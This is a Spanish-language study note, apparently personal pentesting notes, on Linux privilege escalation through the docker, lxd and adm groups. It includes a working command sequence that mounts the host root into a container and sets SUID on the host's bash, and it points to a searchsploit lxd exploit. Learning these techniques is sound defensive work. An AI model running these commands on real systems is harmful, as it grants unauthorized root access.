- Tags : #escalada #escalada_privilegios #escalada_privilegios_grupos #grupos #escalada_privilegios_linux 

En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar** **permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema.

Existen grupos especiales en Linux, como ‘**lxd**‘ o ‘**docker**‘, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.

Por ejemplo, si un usuario tiene acceso al grupo ‘**docker**‘, podría utilizar la herramienta Docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las **monturas** (**mounts**) para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario ‘**root**‘, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor.

Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante limitar cuidadosamente el acceso a estos grupos y asegurarse de que sólo se asignan a usuarios confiables que realmente necesitan acceder a ellos.


```bash
#Usuario savitar , con perteencia al grupo docker puede descargar imagenes y crearse un contenedor y montarse carpetas en este 

docker pull ubuntu

#Creamos un contenedor que monte la raiz `/` de la maquina local en el contenedor en la direccion `/mnt/root`
docker run --rm -dit -v /:/mnt/root --name ejemplo ubuntu 

#Entramos al contenedor, y se entra como root si nos desplazamos a `/mnt/root` estamos en los recursos del sistema y con privilegios de root por lo que pudieramos modificar archivos dar permisos  
docker exec -it ejemplo bash 

#Agregar el permiso SUID a la bash para salir del contenedor y poder tomar una bash como root en la maquina host

cd /mnt/root/bin  #Estamos en el contenedor pero los ficheros son del host

chmod u+s bash    #Por lo que le estariamos dando permiso al bash del host anfitrion
```

T ambien resulta interesante el grupo **adm** , este grupo permite leer los logs del sistema donde pudiéramos leer información privilegiada.

Otro es el grupo lxd, lxd es similar a docker por lo que nos permite crear contenedores y demás.

```bash
searchsploit lxd

#Descargamos el script que automatiza la creacion del contenedor con la montura de la particion, y leemos las instrucciones dentro de sploit que indica como se debe ejecutar 
 
```

![](../../../attachments/Pasted%20image%2020260221085441.png)